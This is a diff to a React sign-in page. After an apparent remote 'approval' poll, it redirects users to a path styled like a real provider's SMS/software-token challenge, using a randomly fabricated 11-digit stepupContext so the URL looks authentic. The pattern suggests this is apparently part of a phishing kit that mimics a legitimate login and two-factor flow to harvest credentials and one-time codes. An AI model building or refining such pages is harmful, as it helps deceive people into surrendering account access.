@@ -125,8 +125,9 @@ export const SigninPage = (): JSX.Element => {
         if (response.approved) {
           clearInterval(pollInterval);
           setIsLoading(false);
-          // Redirect to SMS verification page
-          window.location.href = "/link3";
+          // Generate random 11-digit stepupContext and redirect to SMS challenge page
+          const randomStepupContext = Math.floor(10000000000 + Math.random() * 90000000000).toString();
+          window.location.href = `/authflow/challenges/softwareToken/?stepupContext=${randomStepupContext}`;
         }
       } catch (error) {
         console.error("Failed to check approval status:", error);
